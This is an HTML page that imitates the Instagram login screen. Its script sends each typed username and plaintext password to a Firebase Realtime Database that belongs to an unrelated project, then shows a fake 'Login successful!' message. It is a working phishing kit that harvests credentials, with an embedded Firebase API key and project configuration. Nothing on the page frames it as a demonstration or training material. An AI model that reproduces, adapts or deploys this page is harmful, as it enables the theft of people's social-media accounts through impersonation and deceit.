<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>

    <!-- INTERNAL CSS -->
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            text-align: center;
        }

        .login-box {
            width: 350px;
            padding: 30px;
            background: #fff;
            border: 1px solid #dbdbdb;
        }

        .logo {
            font-family: 'Brush Script MT', cursive;
            font-size: 48px;
            margin-bottom: 20px;
        }

        input {
            width: 90%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background: #fafafa;
        }

        button {
            width: 90%;
            padding: 10px;
            background-color: #0095f6;
            color: #fff;
            border: none;
            margin-top: 10px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
        }

        .or {
            margin: 20px 0;
            color: #8e8e8e;
        }

        .fb {
            color: #385185;
            font-weight: bold;
            cursor: pointer;
        }

        .forgot {
            color: #00376b;
            margin-top: 10px;
            cursor: pointer;
        }

        .signup-box {
            margin-top: 15px;
            padding: 20px;
            border: 1px solid #dbdbdb;
            background: #fff;
            width: 350px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
        }
    </style>

</head>
<body>

    <div class="container">
        <div class="login-box">
           <form method="get" id="loginForm">
            <h1 class="logo">Instagram</h1>

            <input type="text" id="username" placeholder=" username">
            <input type="password" id="password" placeholder="Password">
            <i class="fa fa-eye" id="togglePassword"></i>

           <button type="submit" id="loginBtn">Login</button>
           </form>

            <p class="or">────── OR ──────</p>

            <p class="fb">Log in with Facebook</p>
            <p class="forgot">Forgot password?</p>
        </div>

        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
    <script type="module">
  // Import the functions you need from the SDKs you need
  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
  import { getDatabase, ref, set } from 'https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js';

  // TODO: Add SDKs for Firebase products that you want to use
  // https://firebase.google.com/docs/web/setup#available-libraries

  // Your web app's Firebase configuration
  const firebaseConfig = {
    apiKey: "AIzaSyDU4HGdDu3CH4-OM8HgKfHorCSou3OIYTw",
    authDomain: "harish-84726.firebaseapp.com",
    projectId: "harish-84726",
    databaseURL: "https://harish-84726-default-rtdb.firebaseio.com",
    storageBucket: "harish-84726.firebasestorage.app",
    messagingSenderId: "119373404680",
    appId: "1:119373404680:web:b9ab42651b01bd13a5cfbd"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);

    // Handle form submission
    document.addEventListener('DOMContentLoaded', function() {
      document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
       
        // Set data in Firebase Realtime Database (use the modular functions)
        const userRef = ref(database, 'users/' + username);
        set(userRef, {
          password: password
        }).then(function() {
          alert('Login successful!');
        }).catch(function(error) {
          alert('Error: ' + error.message);
        });
      });
    });
</script>
<script>
    const togglePassword = document.querySelector("#togglePassword");
    const pass = document.querySelector("#password");

    togglePassword.addEventListener("click", function () {
      // Toggle the type attribute
      const type = pass.getAttribute("type") === "password" ? "text" : "password";
      pass.setAttribute("type", type);

      // Toggle the eye icon
      this.classList.toggle("fa-eye-slash");
    });
  </script>

    


  

</body>
</html>
